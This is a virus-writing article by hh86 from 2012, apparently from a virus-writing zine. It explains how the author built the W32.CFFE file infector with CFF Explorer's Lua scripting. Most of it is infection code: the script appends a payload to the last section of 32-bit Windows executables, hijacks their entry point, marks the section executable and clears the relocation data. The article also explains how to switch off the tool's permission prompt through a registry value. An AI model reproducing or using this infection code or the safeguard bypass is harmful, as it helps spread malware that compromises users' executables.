@@ -1,0 +1,197 @@
+                              Infect Using
+                         CFF Explorer Scripting
+                                 by hh86
+
+
+About CFFE
+
+There is a tool, CFF Explorer, it is my favorite.   I saw myself in a dream
+writing this very same article, with no intro.  So, I knew to make my first
+virus using this tool. I call it W32.CFFE.
+
+
+What is it?
+
+CFF Explorer  is a wonderful tool to edit PE files.   It would take quite a
+while  to  write  down  all  of its feature and possible uses.  It supports
+plug-ins and also has its own  scripting language (modified version of Lua)
+to automate the edition of files (I have used it to edit other things too).
+
+
+Can I Has Priviledges?
+
+CFF Explorer has a good security mechanism for some functions that could be
+used to compromise the system.  The default behavior is to ask the user for
+permission to let the script use them.   While my script code is capable of
+infection, it does not use any priviledge function.   It is a good idea and
+reminds me of UAC.  But it is one that can be disabled.
+
+I thought there would be a configuration file, but there is none. Therefore
+I looked into the registry and found its "NTCore" key in HKCU/Software. The
+configuration  data  is  stored  in  a  REG_BINARY  value  by  the  name of 
+"Settings".  Currently, I have version "7.9.0.0" of CFF Explorer installed.
+I did not bother to  check previous versions. The corresponding field entry
+to disable its security mechanism is a 32-bit (boolean) at offset 0x78.
+
+
+Manuscriptum
+
+Script  files  have  extension ".cff".    Via command-line you can run your
+script by passing its name as an argument for CFF Explorer.   Also, scripts
+supports arguments, much in the same way of C.  In the documentation, it is
+written  that  you can run functions using argument "-CFFSCRIPT=".  This is
+true, and partially describes the fact that you can pass as an argument the
+full source code of your script via command-line.
+
+I would  not  recommend  to do  this  from Windows prompt, because you must
+learn to escape some characters. CreateProcess API does not complains about
+it.
+
+Since .cff is a registered  extension, you  can  extract  the path from the
+registry to lookup the installation directory:
+
+"HKEY_CLASSES_ROOT\CFFExplorer.Script\shell\open\command"
+
+I did not  wanted  to  make a script code to be a virus.  So no "CFF.virus"
+thing, someone else might try this someday, simply  by using the find files
+functions  (you  require  priviledges  for  this).    Instead, I  made  the 
+infection procedure as a script, which is actually, a pretty  standard file
+edition in this kind of tools.  ;)    Script and machine code do not infect
+other .cff files, so no cross-platform.   x86 machine code is carried as an
+array within the script.
+
+Here is what the script code looks like (a simplified version of the script
+that is used in the virus):
+
+
+f = OpenFile(... filename ...)
+
+-- 23117 instead of 0x5a4d
+
+if ReadWord(f, 0) == 23117 and ReadWord(f, 2) != 1986 then
+    PE = GetOffset(f, 1)
+
+    -- 22 instead of 0x16 (IMAGE_NT_HEADERS.FileHeader.Characteristics offset)
+    -- 92 instead of 0x5c (IMAGE_NT_HEADERS.OptionalHeader.Subsystem offset)
+    -- 4092 instead of IMAGE_FILE_SYSTEM
+    -- 17744 instead of "PE"
+    -- 332 instead of 0x14c (IMAGE_FILE_MACHINE_I386)
+    -- 2 instead of IMAGE_FILE_EXECUTABLE_IMAGE
+    -- 2 instead of IMAGE_SUBSYSTEM_GUI
+    -- 224 instead of 0xe0 (use this value as standard size of SizeOfOptionalHeader)
+    -- check PE signature
+    -- FileHeader.Machine == IMAGE_FILE_MACHINE_I386
+    -- IsPE64 to discard file with IMAGE_NT_OPTIONAL_HDR64_MAGIC
+    -- must be valid image file, and no system file
+
+    d = 4096
+    c = ReadWord(f, PE + 22)
+    if ReadDword(f, PE) == 17744 and ReadWord(f, PE + 4) == 332 and IsPE64(f) == false and c & 2 == 2 and c & d != d and ReadWord(f, PE + 92) == 2 and ReadWord(f, p + 20) == 224 then
+
+        -- 40 instead of 0x28 (sizeof IMAGE_SECTION_HEADER)
+        -- 20 instead of 0x14 (IMAGE_SECTION_HEADER.PointerToRawData offset)
+        -- 16 instead of 0x10 (IMAGE_SECTION_HEADER.SizeOfRawData offset)
+        -- check PE size (discard file with data outside because AddDataToLastSection might overwrite it)
+
+        SH = GetOffset(f, 5) + (ReadWord(f, PE + 6) - 1) * 40
+        if GetFileSize(f) == ReadDword(f, SH + 20) + ReadDword(f, SH + 16) then
+            h = AddDataToLastSection(f, {... here goes the array of virus values ...})
+            if h then
+
+                -- 40 instead of 0x28 (IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint offset)
+                -- 36 instead of 0x24 (IMAGE_SECTION_HEADER.Characteristics offset)
+                -- 200 instead of 0xc8 (offset of Load Config data directory entry)
+                -- 160 instead of 0xa0 (offset of reloc data directory entry)
+                WriteWord(f, 2, 1986)
+                WriteQword(f, p + 200, 0)
+                WriteQword(f, p + 160, 0)
+                WriteDword(f, h + 1, ReadDword(f, PE + 40))
+                WriteDword(f, PE + 40, OffsetToRva(f, h))
+                WriteDword(f, SH + 36, ReadDword(f, SH + 36) | 0x20000000)
+                SaveFile(f)
+            end
+        end
+    end
+    CloseHandle(f)
+end
+
+
+If  you  want the script code to run faster, you might want to use OpenFile
+function instead of file  name as parameter for all functions. I used it so
+that we can save the modification only if no errors occurred (unfortunately
+there is no exception handling here, so must save in the last and most safe
+moment).
+
+Lua, just like VBScript  (and Visual Basic), process multiple conditions in
+IF by making the evaluation and saving the results until THEN, for example:
+
+    if a()!=1 and b==1 then
+
+Let's suppose that a() returns 1,  b() is executed regardless the result of
+the previous evaluation.  So longer IFs with lots of conditions take longer
+time, and also if they  call many  functions that could have an error, they
+make the code more likely to crash if numerous bad things happen.   JScript
+in the other hand does not do this. If speed is the concern, then use an IF
+for each check.
+
+One  might  think PE64 function would be enough to discard PE32+  files and
+invalid ones.  But it only checks that IMAGE_OPTIONAL_HEADER.Magic field is
+IMAGE_NT_OPTIONAL_HDR64_MAGIC, ignoring IMAGE_FILE_HEADER.Machine field. If
+IMAGE_DOS_HEADER.Magic is invalid, or IMAGE_DOS_HEADER.e_lfanew is invalid,
+or IMAGE_NT_HEADERS.Signature is invalid, function returns false PE32.  You
+might incorrectly assume file is valid and also not PE64. So, we must check
+in the code.   After  all checks are passed, I only use IsPE64 to check the
+first field noted here, to avoid a ReadWord, which takes more bytes.
+
+If you want to get an offset fast, you can use GetOffset function.   In the
+documentation, the ID (indexes)  constant looks like "PE_DosHeader", but we
+can use numeric index instead, to save some bytes.
+
+        -- 60 instead of 0x3c (offset of IMAGE_DOS_HEADER.e_lfanew)
+        PE = ReadDword(f, 60)
+
+We can use:
+
+        -- PE_NtHeaders == 1
+        PE = GetOffset(f, 1)
+
+
+Get to last section header is a rather lengthy equation.    GetOffset helps
+here too.   However, we will get the offset of the beginning of the section
+headers.   It also seems to use SizeOfOptionalHeader to get this particular
+offset, which is better than using NumberOfRvaAndSizes. ;)
+
+
+Using no GetOffset:
+
+        -- 20 instead of 0x14 (offset of IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader)
+        -- 24 instead of 0x18 (offset of IMAGE_NT_HEADERS.OptionalHeader)
+        -- 6 is IMAGE_NT_HEADERS.FileHeader.NumberOfSections
+        -- 40 instead of 0x28 (sizeof IMAGE_SECTION_HEADER)
+
+        SH = PE + ReadWord(f, PE + 20) + 24 + (ReadWord(f, PE + 6) - 1) * 40
+
+Using GetOffset:
+
+        -- 5 instead of "PE_SectionHeaders"
+        -- 6 is IMAGE_NT_HEADERS.FileHeader.NumberOfSections
+        -- 40 instead of 0x28 (sizeof IMAGE_SECTION_HEADER)
+
+        SH = GetOffset(f, "PE_SectionHeaders") + (ReadWord(f, PE + 6) - 1) * 40
+
+Or
+        -- 5 instead of "PE_SectionHeaders"
+
+        SH = GetOffset(f, 5) + (ReadWord(f, PE + 6) - 1) * 40
+
+
+Tomorrow Never Knows
+
+CFF Explorer  has a very impressive architecture, and it is a free tool.  I
+couldn't ask for anything better to play with.  CFF Explorer also  supports
+Extensions  (DLL  files), an x86 version  of  the  script  could be made to 
+spread from PE to PE. I might try it someday.
+
+hh86
+November 2012
+5f3bc5221626b2f8d66261fb073394{at}gmail.com
